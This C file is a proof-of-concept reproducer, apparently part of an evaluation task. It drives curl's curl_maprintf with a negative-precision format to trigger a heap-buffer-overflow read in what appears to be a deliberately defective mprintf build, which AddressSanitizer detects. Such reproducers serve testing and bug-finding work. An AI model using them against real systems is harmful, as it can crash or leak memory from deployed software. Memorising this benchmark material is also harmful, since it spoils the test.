/*
 * probe.c - evaluation PoC for the delocalized mprintf defect.
 *
 * Drives the public curl_maprintf() API from <curl/curl.h> with an
 * in-contract format: a negative precision ("%.-5s"). curl's own public
 * docs (docs/libcurl/curl_mprintf.md, "Precision") promise: "A negative
 * precision is taken as if the precision were omitted" - i.e. this must
 * print the whole string, like the '*' argument form with a negative int.
 *
 * On a correct build this returns "hello" and exits 0.
 * On the defective tree, the omitted-precision sentinel is cast to size_t
 * and passed to the block output sink, which memcpy()s 512 bytes from the
 * 6-byte heap string: AddressSanitizer aborts (heap-buffer-overflow READ).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#ifndef __has_feature
#define __has_feature(x) 0
#endif
#if defined(__SANITIZE_ADDRESS__) || __has_feature(address_sanitizer)
const char *__asan_default_options(void);
const char *__asan_default_options(void)
{
  /* report as a hard abort (SIGABRT) rather than exit(1) */
  return "abort_on_error=1:detect_leaks=0";
}
#endif

#if defined(__GNUC__)
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat"
#pragma GCC diagnostic ignored "-Wformat-extra-args"
#endif

int main(void)
{
  char in[6];
  char *out;
  char *s;

  memcpy(in, "hello", 6);        /* keep the source out of rodata */
  s = malloc(6);                 /* small heap object: "hello\0" */
  if(!s)
    return 2;
  memcpy(s, in, 6);

  /* in-contract: negative precision == precision omitted */
  out = curl_maprintf("%.-5s", s);
  if(!out) {
    fprintf(stderr, "curl_maprintf returned NULL\n");
    free(s);
    return 3;
  }
  if(strcmp(out, "hello"))
    fprintf(stderr, "unexpected output: '%s'\n", out);
  curl_free(out);
  free(s);
  return 0;
}

#if defined(__GNUC__)
#pragma GCC diagnostic pop
#endif
